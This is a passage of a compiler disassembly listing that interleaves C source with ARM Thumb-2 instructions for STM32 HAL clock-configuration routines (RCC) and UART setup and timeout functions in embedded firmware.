        prediv = aPredivFactorTable[(uint32_t)(RCC->CFGR & RCC_CFGR_PLLXTPRE) >> RCC_CFGR_PLLXTPRE_Pos];
 8000a8c:	f3c3 4340 	ubfx	r3, r3, #17, #1
        pllclk = (uint32_t)((HSE_VALUE  * pllmul) / prediv);
 8000a90:	4350      	muls	r0, r2
        prediv = aPredivFactorTable[(uint32_t)(RCC->CFGR & RCC_CFGR_PLLXTPRE) >> RCC_CFGR_PLLXTPRE_Pos];
 8000a92:	aa06      	add	r2, sp, #24
 8000a94:	4413      	add	r3, r2
 8000a96:	f813 3c14 	ldrb.w	r3, [r3, #-20]
        pllclk = (uint32_t)((HSE_VALUE  * pllmul) / prediv);
 8000a9a:	fbb0 f0f3 	udiv	r0, r0, r3
}
 8000a9e:	b007      	add	sp, #28
 8000aa0:	bd30      	pop	{r4, r5, pc}
        pllclk = (uint32_t)((HSI_VALUE >> 1) * pllmul);
 8000aa2:	4805      	ldr	r0, [pc, #20]	; (8000ab8 <HAL_RCC_GetSysClockFreq+0x74>)
 8000aa4:	4350      	muls	r0, r2
 8000aa6:	e7fa      	b.n	8000a9e <HAL_RCC_GetSysClockFreq+0x5a>
      sysclockfreq = HSE_VALUE;
 8000aa8:	4802      	ldr	r0, [pc, #8]	; (8000ab4 <HAL_RCC_GetSysClockFreq+0x70>)
  return sysclockfreq;
 8000aaa:	e7f8      	b.n	8000a9e <HAL_RCC_GetSysClockFreq+0x5a>
 8000aac:	080022cc 	.word	0x080022cc
 8000ab0:	40021000 	.word	0x40021000
 8000ab4:	007a1200 	.word	0x007a1200
 8000ab8:	003d0900 	.word	0x003d0900

08000abc <HAL_RCC_ClockConfig>:
  if(FLatency > (FLASH->ACR & FLASH_ACR_LATENCY))
 8000abc:	4a54      	ldr	r2, [pc, #336]	; (8000c10 <HAL_RCC_ClockConfig+0x154>)
{
 8000abe:	e92d 41f0 	stmdb	sp!, {r4, r5, r6, r7, r8, lr}
  if(FLatency > (FLASH->ACR & FLASH_ACR_LATENCY))
 8000ac2:	6813      	ldr	r3, [r2, #0]
{
 8000ac4:	4605      	mov	r5, r0
  if(FLatency > (FLASH->ACR & FLASH_ACR_LATENCY))
 8000ac6:	f003 0307 	and.w	r3, r3, #7
 8000aca:	428b      	cmp	r3, r1
{
 8000acc:	460e      	mov	r6, r1
  if(FLatency > (FLASH->ACR & FLASH_ACR_LATENCY))
 8000ace:	d32a      	bcc.n	8000b26 <HAL_RCC_ClockConfig+0x6a>
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_HCLK) == RCC_CLOCKTYPE_HCLK)
 8000ad0:	6829      	ldr	r1, [r5, #0]
 8000ad2:	078c      	lsls	r4, r1, #30
 8000ad4:	d434      	bmi.n	8000b40 <HAL_RCC_ClockConfig+0x84>
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_SYSCLK) == RCC_CLOCKTYPE_SYSCLK)
 8000ad6:	07ca      	lsls	r2, r1, #31
 8000ad8:	d447      	bmi.n	8000b6a <HAL_RCC_ClockConfig+0xae>
  if(FLatency < (FLASH->ACR & FLASH_ACR_LATENCY))
 8000ada:	4a4d      	ldr	r2, [pc, #308]	; (8000c10 <HAL_RCC_ClockConfig+0x154>)
 8000adc:	6813      	ldr	r3, [r2, #0]
 8000ade:	f003 0307 	and.w	r3, r3, #7
 8000ae2:	429e      	cmp	r6, r3
 8000ae4:	f0c0 8082 	bcc.w	8000bec <HAL_RCC_ClockConfig+0x130>
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 8000ae8:	682a      	ldr	r2, [r5, #0]
 8000aea:	4c4a      	ldr	r4, [pc, #296]	; (8000c14 <HAL_RCC_ClockConfig+0x158>)
 8000aec:	f012 0f04 	tst.w	r2, #4
 8000af0:	f040 8087 	bne.w	8000c02 <HAL_RCC_ClockConfig+0x146>
  if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 8000af4:	0713      	lsls	r3, r2, #28
 8000af6:	d506      	bpl.n	8000b06 <HAL_RCC_ClockConfig+0x4a>
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, ((RCC_ClkInitStruct->APB2CLKDivider) << 3));
 8000af8:	6863      	ldr	r3, [r4, #4]
 8000afa:	692a      	ldr	r2, [r5, #16]
 8000afc:	f423 5360 	bic.w	r3, r3, #14336	; 0x3800
 8000b00:	ea43 03c2 	orr.w	r3, r3, r2, lsl #3
 8000b04:	6063      	str	r3, [r4, #4]
  SystemCoreClock = HAL_RCC_GetSysClockFreq() >> AHBPrescTable[(RCC->CFGR & RCC_CFGR_HPRE)>> RCC_CFGR_HPRE_Pos];
 8000b06:	f7ff ff9d 	bl	8000a44 <HAL_RCC_GetSysClockFreq>
 8000b0a:	6863      	ldr	r3, [r4, #4]
 8000b0c:	4a42      	ldr	r2, [pc, #264]	; (8000c18 <HAL_RCC_ClockConfig+0x15c>)
 8000b0e:	f3c3 1303 	ubfx	r3, r3, #4, #4
 8000b12:	5cd3      	ldrb	r3, [r2, r3]
 8000b14:	40d8      	lsrs	r0, r3
 8000b16:	4b41      	ldr	r3, [pc, #260]	; (8000c1c <HAL_RCC_ClockConfig+0x160>)
 8000b18:	6018      	str	r0, [r3, #0]
  HAL_InitTick (TICK_INT_PRIORITY);
 8000b1a:	2000      	movs	r0, #0
 8000b1c:	f7ff fb16 	bl	800014c <HAL_InitTick>
  return HAL_OK;
 8000b20:	2000      	movs	r0, #0
}
 8000b22:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
    __HAL_FLASH_SET_LATENCY(FLatency);
 8000b26:	6813      	ldr	r3, [r2, #0]
 8000b28:	f023 0307 	bic.w	r3, r3, #7
 8000b2c:	430b      	orrs	r3, r1
 8000b2e:	6013      	str	r3, [r2, #0]
    if((FLASH->ACR & FLASH_ACR_LATENCY) != FLatency)
 8000b30:	6813      	ldr	r3, [r2, #0]
 8000b32:	f003 0307 	and.w	r3, r3, #7
 8000b36:	4299      	cmp	r1, r3
 8000b38:	d0ca      	beq.n	8000ad0 <HAL_RCC_ClockConfig+0x14>
      return HAL_ERROR;
 8000b3a:	2001      	movs	r0, #1
 8000b3c:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
 8000b40:	4b34      	ldr	r3, [pc, #208]	; (8000c14 <HAL_RCC_ClockConfig+0x158>)
    if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK1) == RCC_CLOCKTYPE_PCLK1)
 8000b42:	f011 0f04 	tst.w	r1, #4
      MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_HCLK_DIV16);
 8000b46:	bf1e      	ittt	ne
 8000b48:	685a      	ldrne	r2, [r3, #4]
 8000b4a:	f442 62e0 	orrne.w	r2, r2, #1792	; 0x700
 8000b4e:	605a      	strne	r2, [r3, #4]
    if(((RCC_ClkInitStruct->ClockType) & RCC_CLOCKTYPE_PCLK2) == RCC_CLOCKTYPE_PCLK2)
 8000b50:	0708      	lsls	r0, r1, #28
      MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE2, (RCC_HCLK_DIV16 << 3));
 8000b52:	bf42      	ittt	mi
 8000b54:	685a      	ldrmi	r2, [r3, #4]
 8000b56:	f442 5260 	orrmi.w	r2, r2, #14336	; 0x3800
 8000b5a:	605a      	strmi	r2, [r3, #4]
    MODIFY_REG(RCC->CFGR, RCC_CFGR_HPRE, RCC_ClkInitStruct->AHBCLKDivider);
 8000b5c:	685a      	ldr	r2, [r3, #4]
 8000b5e:	68a8      	ldr	r0, [r5, #8]
 8000b60:	f022 02f0 	bic.w	r2, r2, #240	; 0xf0
 8000b64:	4302      	orrs	r2, r0
 8000b66:	605a      	str	r2, [r3, #4]
 8000b68:	e7b5      	b.n	8000ad6 <HAL_RCC_ClockConfig+0x1a>
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 8000b6a:	686a      	ldr	r2, [r5, #4]
 8000b6c:	4c29      	ldr	r4, [pc, #164]	; (8000c14 <HAL_RCC_ClockConfig+0x158>)
 8000b6e:	2a01      	cmp	r2, #1
      if(__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) == RESET)
 8000b70:	6823      	ldr	r3, [r4, #0]
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 8000b72:	d11c      	bne.n	8000bae <HAL_RCC_ClockConfig+0xf2>
      if(__HAL_RCC_GET_FLAG(RCC_FLAG_HSERDY) == RESET)
 8000b74:	f413 3f00 	tst.w	r3, #131072	; 0x20000
      if(__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) == RESET)
 8000b78:	d0df      	beq.n	8000b3a <HAL_RCC_ClockConfig+0x7e>
    __HAL_RCC_SYSCLK_CONFIG(RCC_ClkInitStruct->SYSCLKSource);
 8000b7a:	6863      	ldr	r3, [r4, #4]
        if((HAL_GetTick() - tickstart ) > CLOCKSWITCH_TIMEOUT_VALUE)
 8000b7c:	f241 3888 	movw	r8, #5000	; 0x1388
    __HAL_RCC_SYSCLK_CONFIG(RCC_ClkInitStruct->SYSCLKSource);
 8000b80:	f023 0303 	bic.w	r3, r3, #3
 8000b84:	4313      	orrs	r3, r2
 8000b86:	6063      	str	r3, [r4, #4]
    tickstart = HAL_GetTick();
 8000b88:	f7ff fb22 	bl	80001d0 <HAL_GetTick>
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 8000b8c:	686b      	ldr	r3, [r5, #4]
    tickstart = HAL_GetTick();
 8000b8e:	4607      	mov	r7, r0
    if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_HSE)
 8000b90:	2b01      	cmp	r3, #1
 8000b92:	d114      	bne.n	8000bbe <HAL_RCC_ClockConfig+0x102>
      while (__HAL_RCC_GET_SYSCLK_SOURCE() != RCC_SYSCLKSOURCE_STATUS_HSE)
 8000b94:	6863      	ldr	r3, [r4, #4]
 8000b96:	f003 030c 	and.w	r3, r3, #12
 8000b9a:	2b04      	cmp	r3, #4
 8000b9c:	d09d      	beq.n	8000ada <HAL_RCC_ClockConfig+0x1e>
        if((HAL_GetTick() - tickstart ) > CLOCKSWITCH_TIMEOUT_VALUE)
 8000b9e:	f7ff fb17 	bl	80001d0 <HAL_GetTick>
 8000ba2:	1bc0      	subs	r0, r0, r7
 8000ba4:	4540      	cmp	r0, r8
 8000ba6:	d9f5      	bls.n	8000b94 <HAL_RCC_ClockConfig+0xd8>
          return HAL_TIMEOUT;
 8000ba8:	2003      	movs	r0, #3
 8000baa:	e8bd 81f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, pc}
    else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 8000bae:	2a02      	cmp	r2, #2
 8000bb0:	d102      	bne.n	8000bb8 <HAL_RCC_ClockConfig+0xfc>
      if(__HAL_RCC_GET_FLAG(RCC_FLAG_PLLRDY) == RESET)
 8000bb2:	f013 7f00 	tst.w	r3, #33554432	; 0x2000000
 8000bb6:	e7df      	b.n	8000b78 <HAL_RCC_ClockConfig+0xbc>
      if(__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) == RESET)
 8000bb8:	f013 0f02 	tst.w	r3, #2
 8000bbc:	e7dc      	b.n	8000b78 <HAL_RCC_ClockConfig+0xbc>
    else if(RCC_ClkInitStruct->SYSCLKSource == RCC_SYSCLKSOURCE_PLLCLK)
 8000bbe:	2b02      	cmp	r3, #2
 8000bc0:	d10f      	bne.n	8000be2 <HAL_RCC_ClockConfig+0x126>
      while (__HAL_RCC_GET_SYSCLK_SOURCE() != RCC_SYSCLKSOURCE_STATUS_PLLCLK)
 8000bc2:	6863      	ldr	r3, [r4, #4]
 8000bc4:	f003 030c 	and.w	r3, r3, #12
 8000bc8:	2b08      	cmp	r3, #8
 8000bca:	d086      	beq.n	8000ada <HAL_RCC_ClockConfig+0x1e>
        if((HAL_GetTick() - tickstart ) > CLOCKSWITCH_TIMEOUT_VALUE)
 8000bcc:	f7ff fb00 	bl	80001d0 <HAL_GetTick>
 8000bd0:	1bc0      	subs	r0, r0, r7
 8000bd2:	4540      	cmp	r0, r8
 8000bd4:	d9f5      	bls.n	8000bc2 <HAL_RCC_ClockConfig+0x106>
 8000bd6:	e7e7      	b.n	8000ba8 <HAL_RCC_ClockConfig+0xec>
        if((HAL_GetTick() - tickstart ) > CLOCKSWITCH_TIMEOUT_VALUE)
 8000bd8:	f7ff fafa 	bl	80001d0 <HAL_GetTick>
 8000bdc:	1bc0      	subs	r0, r0, r7
 8000bde:	4540      	cmp	r0, r8
 8000be0:	d8e2      	bhi.n	8000ba8 <HAL_RCC_ClockConfig+0xec>
      while (__HAL_RCC_GET_SYSCLK_SOURCE() != RCC_SYSCLKSOURCE_STATUS_HSI)
 8000be2:	6863      	ldr	r3, [r4, #4]
 8000be4:	f013 0f0c 	tst.w	r3, #12
 8000be8:	d1f6      	bne.n	8000bd8 <HAL_RCC_ClockConfig+0x11c>
 8000bea:	e776      	b.n	8000ada <HAL_RCC_ClockConfig+0x1e>
    __HAL_FLASH_SET_LATENCY(FLatency);
 8000bec:	6813      	ldr	r3, [r2, #0]
 8000bee:	f023 0307 	bic.w	r3, r3, #7
 8000bf2:	4333      	orrs	r3, r6
 8000bf4:	6013      	str	r3, [r2, #0]
    if((FLASH->ACR & FLASH_ACR_LATENCY) != FLatency)
 8000bf6:	6813      	ldr	r3, [r2, #0]
 8000bf8:	f003 0307 	and.w	r3, r3, #7
 8000bfc:	429e      	cmp	r6, r3
 8000bfe:	d19c      	bne.n	8000b3a <HAL_RCC_ClockConfig+0x7e>
 8000c00:	e772      	b.n	8000ae8 <HAL_RCC_ClockConfig+0x2c>
    MODIFY_REG(RCC->CFGR, RCC_CFGR_PPRE1, RCC_ClkInitStruct->APB1CLKDivider);
 8000c02:	6863      	ldr	r3, [r4, #4]
 8000c04:	68e9      	ldr	r1, [r5, #12]
 8000c06:	f423 63e0 	bic.w	r3, r3, #1792	; 0x700
 8000c0a:	430b      	orrs	r3, r1
 8000c0c:	6063      	str	r3, [r4, #4]
 8000c0e:	e771      	b.n	8000af4 <HAL_RCC_ClockConfig+0x38>
 8000c10:	40022000 	.word	0x40022000
 8000c14:	40021000 	.word	0x40021000
 8000c18:	08002476 	.word	0x08002476
 8000c1c:	2000186c 	.word	0x2000186c

08000c20 <HAL_RCC_GetPCLK1Freq>:
  return (HAL_RCC_GetHCLKFreq() >> APBPrescTable[(RCC->CFGR & RCC_CFGR_PPRE1) >> RCC_CFGR_PPRE1_Pos]);
 8000c20:	4b04      	ldr	r3, [pc, #16]	; (8000c34 <HAL_RCC_GetPCLK1Freq+0x14>)
 8000c22:	4a05      	ldr	r2, [pc, #20]	; (8000c38 <HAL_RCC_GetPCLK1Freq+0x18>)
 8000c24:	685b      	ldr	r3, [r3, #4]
 8000c26:	f3c3 2302 	ubfx	r3, r3, #8, #3
 8000c2a:	5cd3      	ldrb	r3, [r2, r3]
 8000c2c:	4a03      	ldr	r2, [pc, #12]	; (8000c3c <HAL_RCC_GetPCLK1Freq+0x1c>)
 8000c2e:	6810      	ldr	r0, [r2, #0]
}    
 8000c30:	40d8      	lsrs	r0, r3
 8000c32:	4770      	bx	lr
 8000c34:	40021000 	.word	0x40021000
 8000c38:	08002486 	.word	0x08002486
 8000c3c:	2000186c 	.word	0x2000186c

08000c40 <HAL_RCC_GetPCLK2Freq>:
  return (HAL_RCC_GetHCLKFreq()>> APBPrescTable[(RCC->CFGR & RCC_CFGR_PPRE2) >> RCC_CFGR_PPRE2_Pos]);
 8000c40:	4b04      	ldr	r3, [pc, #16]	; (8000c54 <HAL_RCC_GetPCLK2Freq+0x14>)
 8000c42:	4a05      	ldr	r2, [pc, #20]	; (8000c58 <HAL_RCC_GetPCLK2Freq+0x18>)
 8000c44:	685b      	ldr	r3, [r3, #4]
 8000c46:	f3c3 23c2 	ubfx	r3, r3, #11, #3
 8000c4a:	5cd3      	ldrb	r3, [r2, r3]
 8000c4c:	4a03      	ldr	r2, [pc, #12]	; (8000c5c <HAL_RCC_GetPCLK2Freq+0x1c>)
 8000c4e:	6810      	ldr	r0, [r2, #0]
} 
 8000c50:	40d8      	lsrs	r0, r3
 8000c52:	4770      	bx	lr
 8000c54:	40021000 	.word	0x40021000
 8000c58:	08002486 	.word	0x08002486
 8000c5c:	2000186c 	.word	0x2000186c

08000c60 <UART_EndRxTransfer>:
  * @retval None
  */
static void UART_EndRxTransfer(UART_HandleTypeDef *huart)
{
  /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error) interrupts */
  CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8000c60:	6803      	ldr	r3, [r0, #0]
 8000c62:	68da      	ldr	r2, [r3, #12]
 8000c64:	f422 7290 	bic.w	r2, r2, #288	; 0x120
 8000c68:	60da      	str	r2, [r3, #12]
  CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8000c6a:	695a      	ldr	r2, [r3, #20]
 8000c6c:	f022 0201 	bic.w	r2, r2, #1
 8000c70:	615a      	str	r2, [r3, #20]

  /* At end of Rx process, restore huart->RxState to Ready */
  huart->RxState = HAL_UART_STATE_READY;
 8000c72:	2320      	movs	r3, #32
 8000c74:	f880 303a 	strb.w	r3, [r0, #58]	; 0x3a
 8000c78:	4770      	bx	lr
	...

08000c7c <UART_SetConfig>:
  * @param  huart: pointer to a UART_HandleTypeDef structure that contains
  *                the configuration information for the specified UART module.
  * @retval None
  */
static void UART_SetConfig(UART_HandleTypeDef *huart)
{
 8000c7c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
  assert_param(IS_UART_MODE(huart->Init.Mode));

  /*------- UART-associated USART registers setting : CR2 Configuration ------*/
  /* Configure the UART Stop Bits: Set STOP[13:12] bits according 
   * to huart->Init.StopBits value */
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8000c80:	6805      	ldr	r5, [r0, #0]
 8000c82:	68c2      	ldr	r2, [r0, #12]
 8000c84:	692b      	ldr	r3, [r5, #16]
  tmpreg |= (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode | huart->Init.OverSampling;
  MODIFY_REG(huart->Instance->CR1, 
             (uint32_t)(USART_CR1_M | USART_CR1_PCE | USART_CR1_PS | USART_CR1_TE | USART_CR1_RE | USART_CR1_OVER8), 
             tmpreg);
#else
  tmpreg |= (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode;
 8000c86:	6901      	ldr	r1, [r0, #16]
  MODIFY_REG(huart->Instance->CR2, USART_CR2_STOP, huart->Init.StopBits);
 8000c88:	f423 5340 	bic.w	r3, r3, #12288	; 0x3000
 8000c8c:	4313      	orrs	r3, r2
 8000c8e:	612b      	str	r3, [r5, #16]
  tmpreg |= (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode;
 8000c90:	6883      	ldr	r3, [r0, #8]
  MODIFY_REG(huart->Instance->CR1, 
 8000c92:	68ea      	ldr	r2, [r5, #12]
  tmpreg |= (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode;
 8000c94:	430b      	orrs	r3, r1
 8000c96:	6941      	ldr	r1, [r0, #20]
  MODIFY_REG(huart->Instance->CR1, 
 8000c98:	f422 52b0 	bic.w	r2, r2, #5632	; 0x1600
 8000c9c:	f022 020c 	bic.w	r2, r2, #12
  tmpreg |= (uint32_t)huart->Init.WordLength | huart->Init.Parity | huart->Init.Mode;
 8000ca0:	430b      	orrs	r3, r1
  MODIFY_REG(huart->Instance->CR1, 
 8000ca2:	4313      	orrs	r3, r2
 8000ca4:	60eb      	str	r3, [r5, #12]
             tmpreg);
#endif /* USART_CR1_OVER8 */

  /*------- UART-associated USART registers setting : CR3 Configuration ------*/
  /* Configure the UART HFC: Set CTSE and RTSE bits according to huart->Init.HwFlowCtl value */
  MODIFY_REG(huart->Instance->CR3, (USART_CR3_RTSE | USART_CR3_CTSE), huart->Init.HwFlowCtl);
 8000ca6:	696b      	ldr	r3, [r5, #20]
 8000ca8:	6982      	ldr	r2, [r0, #24]
 8000caa:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8000cae:	4313      	orrs	r3, r2
 8000cb0:	616b      	str	r3, [r5, #20]
      huart->Instance->BRR = UART_BRR_SAMPLING16(HAL_RCC_GetPCLK1Freq(), huart->Init.BaudRate);
    }
  }
#else
  /*-------------------------- USART BRR Configuration ---------------------*/
  if(huart->Instance == USART1)
 8000cb2:	4b40      	ldr	r3, [pc, #256]	; (8000db4 <UART_SetConfig+0x138>)
{
 8000cb4:	4681      	mov	r9, r0
  if(huart->Instance == USART1)
 8000cb6:	429d      	cmp	r5, r3
 8000cb8:	f04f 0419 	mov.w	r4, #25
 8000cbc:	d146      	bne.n	8000d4c <UART_SetConfig+0xd0>
  {
    huart->Instance->BRR = UART_BRR_SAMPLING16(HAL_RCC_GetPCLK2Freq(), huart->Init.BaudRate);
 8000cbe:	f7ff ffbf 	bl	8000c40 <HAL_RCC_GetPCLK2Freq>
 8000cc2:	fb04 f300 	mul.w	r3, r4, r0
 8000cc6:	f8d9 6004 	ldr.w	r6, [r9, #4]
 8000cca:	f04f 0864 	mov.w	r8, #100	; 0x64
 8000cce:	00b6      	lsls	r6, r6, #2
 8000cd0:	fbb3 f3f6 	udiv	r3, r3, r6
 8000cd4:	fbb3 f3f8 	udiv	r3, r3, r8
 8000cd8:	011e      	lsls	r6, r3, #4
 8000cda:	f7ff ffb1 	bl	8000c40 <HAL_RCC_GetPCLK2Freq>
 8000cde:	4360      	muls	r0, r4
 8000ce0:	f8d9 3004 	ldr.w	r3, [r9, #4]
 8000ce4:	009b      	lsls	r3, r3, #2
 8000ce6:	fbb0 f7f3 	udiv	r7, r0, r3
 8000cea:	f7ff ffa9 	bl	8000c40 <HAL_RCC_GetPCLK2Freq>
 8000cee:	4360      	muls	r0, r4
 8000cf0:	f8d9 3004 	ldr.w	r3, [r9, #4]
 8000cf4:	009b      	lsls	r3, r3, #2
 8000cf6:	fbb0 f3f3 	udiv	r3, r0, r3
 8000cfa:	fbb3 f3f8 	udiv	r3, r3, r8
 8000cfe:	fb08 7313 	mls	r3, r8, r3, r7
 8000d02:	011b      	lsls	r3, r3, #4
 8000d04:	3332      	adds	r3, #50	; 0x32
 8000d06:	fbb3 f3f8 	udiv	r3, r3, r8
 8000d0a:	f003 07f0 	and.w	r7, r3, #240	; 0xf0
 8000d0e:	f7ff ff97 	bl	8000c40 <HAL_RCC_GetPCLK2Freq>
 8000d12:	4360      	muls	r0, r4
 8000d14:	f8d9 2004 	ldr.w	r2, [r9, #4]
 8000d18:	0092      	lsls	r2, r2, #2
 8000d1a:	fbb0 faf2 	udiv	sl, r0, r2
 8000d1e:	f7ff ff8f 	bl	8000c40 <HAL_RCC_GetPCLK2Freq>
  }
  else
  {
    huart->Instance->BRR = UART_BRR_SAMPLING16(HAL_RCC_GetPCLK1Freq(), huart->Init.BaudRate);
 8000d22:	4360      	muls	r0, r4
 8000d24:	f8d9 3004 	ldr.w	r3, [r9, #4]
 8000d28:	009b      	lsls	r3, r3, #2
 8000d2a:	fbb0 f3f3 	udiv	r3, r0, r3
 8000d2e:	fbb3 f3f8 	udiv	r3, r3, r8
 8000d32:	fb08 a313 	mls	r3, r8, r3, sl
 8000d36:	011b      	lsls	r3, r3, #4
 8000d38:	3332      	adds	r3, #50	; 0x32
 8000d3a:	fbb3 f3f8 	udiv	r3, r3, r8
 8000d3e:	f003 030f 	and.w	r3, r3, #15
 8000d42:	433b      	orrs	r3, r7
 8000d44:	4433      	add	r3, r6
 8000d46:	60ab      	str	r3, [r5, #8]
 8000d48:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 8000d4c:	f7ff ff68 	bl	8000c20 <HAL_RCC_GetPCLK1Freq>
 8000d50:	fb04 f300 	mul.w	r3, r4, r0
 8000d54:	f8d9 6004 	ldr.w	r6, [r9, #4]
 8000d58:	f04f 0864 	mov.w	r8, #100	; 0x64
 8000d5c:	00b6      	lsls	r6, r6, #2
 8000d5e:	fbb3 f3f6 	udiv	r3, r3, r6
 8000d62:	fbb3 f3f8 	udiv	r3, r3, r8
 8000d66:	011e      	lsls	r6, r3, #4
 8000d68:	f7ff ff5a 	bl	8000c20 <HAL_RCC_GetPCLK1Freq>
 8000d6c:	4360      	muls	r0, r4
 8000d6e:	f8d9 3004 	ldr.w	r3, [r9, #4]
 8000d72:	009b      	lsls	r3, r3, #2
 8000d74:	fbb0 f7f3 	udiv	r7, r0, r3
 8000d78:	f7ff ff52 	bl	8000c20 <HAL_RCC_GetPCLK1Freq>
 8000d7c:	4360      	muls	r0, r4
 8000d7e:	f8d9 3004 	ldr.w	r3, [r9, #4]
 8000d82:	009b      	lsls	r3, r3, #2
 8000d84:	fbb0 f3f3 	udiv	r3, r0, r3
 8000d88:	fbb3 f3f8 	udiv	r3, r3, r8
 8000d8c:	fb08 7313 	mls	r3, r8, r3, r7
 8000d90:	011b      	lsls	r3, r3, #4
 8000d92:	3332      	adds	r3, #50	; 0x32
 8000d94:	fbb3 f3f8 	udiv	r3, r3, r8
 8000d98:	f003 07f0 	and.w	r7, r3, #240	; 0xf0
 8000d9c:	f7ff ff40 	bl	8000c20 <HAL_RCC_GetPCLK1Freq>
 8000da0:	4360      	muls	r0, r4
 8000da2:	f8d9 2004 	ldr.w	r2, [r9, #4]
 8000da6:	0092      	lsls	r2, r2, #2
 8000da8:	fbb0 faf2 	udiv	sl, r0, r2
 8000dac:	f7ff ff38 	bl	8000c20 <HAL_RCC_GetPCLK1Freq>
 8000db0:	e7b7      	b.n	8000d22 <UART_SetConfig+0xa6>
 8000db2:	bf00      	nop
 8000db4:	40013800 	.word	0x40013800

08000db8 <UART_WaitOnFlagUntilTimeout.constprop.3>:
static HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status, uint32_t Tickstart, uint32_t Timeout)
 8000db8:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 8000dba:	4604      	mov	r4, r0
 8000dbc:	460e      	mov	r6, r1
 8000dbe:	4617      	mov	r7, r2
 8000dc0:	461d      	mov	r5, r3
  while((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status) 
 8000dc2:	6821      	ldr	r1, [r4, #0]
 8000dc4:	680b      	ldr	r3, [r1, #0]
 8000dc6:	ea36 0303 	bics.w	r3, r6, r3
 8000dca:	d101      	bne.n	8000dd0 <UART_WaitOnFlagUntilTimeout.constprop.3+0x18>
  return HAL_OK;
 8000dcc:	2000      	movs	r0, #0
}
 8000dce:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}
    if(Timeout != HAL_MAX_DELAY)
 8000dd0:	1c6b      	adds	r3, r5, #1
 8000dd2:	d0f7      	beq.n	8000dc4 <UART_WaitOnFlagUntilTimeout.constprop.3+0xc>
      if((Timeout == 0U)||((HAL_GetTick() - Tickstart ) > Timeout))
 8000dd4:	b995      	cbnz	r5, 8000dfc <UART_WaitOnFlagUntilTimeout.constprop.3+0x44>
        CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE | USART_CR1_TXEIE));
 8000dd6:	6823      	ldr	r3, [r4, #0]
        __HAL_UNLOCK(huart);
 8000dd8:	2003      	movs	r0, #3
        CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE | USART_CR1_TXEIE));
 8000dda:	68da      	ldr	r2, [r3, #12]
 8000ddc:	f422 72d0 	bic.w	r2, r2, #416	; 0x1a0
 8000de0:	60da      	str	r2, [r3, #12]
        CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8000de2:	695a      	ldr	r2, [r3, #20]
 8000de4:	f022 0201 	bic.w	r2, r2, #1
 8000de8:	615a      	str	r2, [r3, #20]
        huart->gState  = HAL_UART_STATE_READY;
 8000dea:	2320      	movs	r3, #32
 8000dec:	f884 3039 	strb.w	r3, [r4, #57]	; 0x39
        huart->RxState = HAL_UART_STATE_READY;
 8000df0:	f884 303a 	strb.w	r3, [r4, #58]	; 0x3a
        __HAL_UNLOCK(huart);
 8000df4:	2300      	movs	r3, #0
 8000df6:	f884 3038 	strb.w	r3, [r4, #56]	; 0x38
 8000dfa:	bdf8      	pop	{r3, r4, r5, r6, r7, pc}
      if((Timeout == 0U)||((HAL_GetTick() - Tickstart ) > Timeout))
 8000dfc:	f7ff f9e8 	bl	80001d0 <HAL_GetTick>
 8000e00:	1bc0      	subs	r0, r0, r7
 8000e02:	4285      	cmp	r5, r0
 8000e04:	d2dd      	bcs.n	8000dc2 <UART_WaitOnFlagUntilTimeout.constprop.3+0xa>
 8000e06:	e7e6      	b.n	8000dd6 <UART_WaitOnFlagUntilTimeout.constprop.3+0x1e>

08000e08 <HAL_UART_Init>:
{
 8000e08:	b510      	push	{r4, lr}
  if(huart == NULL)
 8000e0a:	4604      	mov	r4, r0
 8000e0c:	b340      	cbz	r0, 8000e60 <HAL_UART_Init+0x58>
  if(huart->gState == HAL_UART_STATE_RESET)
 8000e0e:	f890 3039 	ldrb.w	r3, [r0, #57]	; 0x39
 8000e12:	f003 02ff 	and.w	r2, r3, #255	; 0xff
 8000e16:	b91b      	cbnz	r3, 8000e20 <HAL_UART_Init+0x18>
    huart->Lock = HAL_UNLOCKED;
